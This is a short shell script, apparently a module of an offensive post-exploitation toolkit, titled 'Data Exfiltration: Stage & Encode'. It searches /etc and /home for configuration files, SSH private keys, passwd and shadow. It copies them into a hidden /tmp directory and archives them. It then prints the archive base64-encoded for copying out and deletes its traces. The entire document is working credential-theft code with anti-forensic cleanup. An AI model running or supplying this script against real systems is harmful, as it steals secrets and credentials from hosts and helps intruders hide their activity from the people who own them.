# Data Staging and Encoding
# Usage: load exfil/stage_and_encode.sh

print_header "Data Exfiltration: Stage & Encode"

# Define interesting files to look for
INTERESTING_FILES="*.conf *.config *.xml *.json *.yaml *.sql *.db *.pem *.key id_rsa shadow passwd hosts"

STAGING_DIR="/tmp/.exfil_$(date +%s)"
mkdir -p "$STAGING_DIR"

print_with_label "Searching for interesting files in /etc and /home..."
# Limit search to avoid taking too long
find /etc /home -maxdepth 3 -type f \( -name "*.conf" -o -name "*.config" -o -name "*.key" -o -name "id_rsa" -o -name "passwd" -o -name "shadow" \) 2>/dev/null | head -n 20 | while read -r file; do
    cp "$file" "$STAGING_DIR/"
done

print_success "Files staged in $STAGING_DIR"

ARCHIVE_NAME="/tmp/exfil_data.tar.gz"
tar -czf "$ARCHIVE_NAME" -C "$STAGING_DIR" . 2>/dev/null

if [ -f "$ARCHIVE_NAME" ]; then
    print_success "Archive created: $ARCHIVE_NAME"
    
    print_with_label "Base64 Encoded Archive (Copy this):"
    base64 "$ARCHIVE_NAME" | tr -d '\n'
    echo "" # Newline
    
    # Cleanup
    rm -rf "$STAGING_DIR"
    rm "$ARCHIVE_NAME"
    print_success "Cleanup complete."
else
    print_error "Failed to create archive."
fi
